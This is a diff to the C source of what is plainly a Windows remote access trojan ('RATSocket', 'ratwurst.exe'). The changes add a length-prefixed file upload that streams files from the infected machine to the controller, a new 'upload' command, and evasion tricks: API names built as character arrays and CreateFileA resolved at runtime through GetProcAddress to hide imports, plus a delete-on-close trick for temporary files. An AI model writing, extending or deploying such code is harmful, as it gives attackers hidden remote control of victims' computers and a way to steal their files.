@@ -20,6 +20,7 @@ typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
 typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
 typedef BOOL _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef HANDLE _CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 typedef DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
 typedef BOOL _CloseHandle(HANDLE hObject);
 
@@ -60,12 +61,19 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
 			if ( readSize > 0 )
 			{
+				char sizeToSend[8] = {};
+				_itoa_s((int)readSize, sizeToSend, 8, 10);
+				
+				SocketSend(ratSocket, sizeToSend, 8);
 				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
 			}
+			else
+			{
+				SocketSend(ratSocket, "0", 1);
+			}
 		}
-		SocketSend(ratSocket, "DONE", 4);
 		OutputDebugString("DONE");
 		fclose(fs);
 		return 0;
@@ -223,6 +231,7 @@ WinMain(HINSTANCE hInstance,
 		char ca_info[] = { 'i','n','f','o',0 };
 		char ca_cmd[] = { 'c','m','d',0 };
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
+		char ca_upload[] = { 'u','p','l','o','a','d',0 };
 
 		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = {};
 		SplitString(recvBuffer, splittedCommand, " ");
@@ -270,6 +279,10 @@ WinMain(HINSTANCE hInstance,
 			char bufferInfo[SOCKET_BUFFER_SIZE];
 			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
 			SocketSend(&ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));
+		}
+		else if ( strcmp(splittedCommand[0], ca_upload) == 0 )
+		{
+			SocketUploadFile(&ratSocket, "x:\\build\\ratwurst.exe");
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
@@ -334,7 +347,9 @@ WinMain(HINSTANCE hInstance,
 			SocketUploadFile(&ratSocket, filePath);
 
 			// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
-			HANDLE handle = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+			char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
+			_CreateFileA* f_CreateFileA = (_CreateFileA*)GetProcAddress(libraryKernel32, ca_CreateFileA);
+			HANDLE handle = f_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
 			if ( handle == INVALID_HANDLE_VALUE )
 			{
 				OutputDebugStringA("Error deleting file at");
